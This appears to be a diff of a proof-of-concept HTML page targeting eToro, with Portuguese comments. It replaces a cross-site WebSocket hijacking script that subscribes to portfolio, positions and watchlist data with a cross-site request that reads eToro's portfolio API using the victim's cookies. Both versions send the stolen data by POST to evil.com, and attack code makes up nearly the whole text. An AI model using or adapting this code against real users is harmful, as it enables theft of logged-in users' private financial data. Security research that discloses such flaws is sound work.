@@ -7,55 +7,20 @@
     <h2>eToro CSWSH Proof of Concept</h2>
     <div id="data"></div>
     
-    <script>
-    const ws = new WebSocket('wss://push-lightstreamer.cloud.etoro.com/lightstreamer');
-    let stolenData = [];
-    
-    function log(msg) {
-        const div = document.getElementById('data');
-        div.innerHTML += `<p>${msg}</p>`;
-    }
-    
-    ws.onopen = function() {
-        log('[+] WebSocket Connected!');
-        
-        // Handshake do Lightstreamer
-        ws.send('LS_polling');
-        ws.send('LS_session');
-        
-        setTimeout(() => {
-            // Comandos para extrair dados
-            ws.send('subscribe,table,SELECT * FROM portfolio');
-            ws.send('subscribe,table,SELECT * FROM positions');
-            ws.send('subscribe,table,SELECT * FROM watchlist');
-            ws.send('subscribe,table,SELECT * FROM notifications');
-            log('[+] Sent subscription commands');
-        }, 1000);
-    };
-    
-    ws.onmessage = function(event) {
-        const data = event.data;
-        log(`[DATA] ${data.substring(0, 200)}`);
-        stolenData.push(data);
-        
-        // Exfiltrar para servidor do atacante
-        fetch('https://evil.com/collect', {
-            method: 'POST',
-            mode: 'no-cors',
-            body: JSON.stringify(stolenData)
-        });
-    };
-    
-    ws.onerror = function(err) {
-        log(`[-] Error: ${err}`);
-    };
-    
-    // Monitorar quanto tempo a conexão permanece
-    setInterval(() => {
-        if (ws.readyState === WebSocket.OPEN) {
-            log('[+] Connection still alive');
-        }
-    }, 30000);
-    </script>
+    <!-- Site malicioso: https://evil.com -->
+<script>
+// Roubar dados do usuário logado na eToro
+fetch('https://api.etoro.com/v1/portfolio', {
+    credentials: 'include'  // Envia cookies da eToro
+})
+.then(r => r.json())
+.then(data => {
+    // Enviar dados roubados para o atacante
+    fetch('https://evil.com/steal', {
+        method: 'POST',
+        body: JSON.stringify(data)
+    });
+});
+</script>
 </body>
 </html>
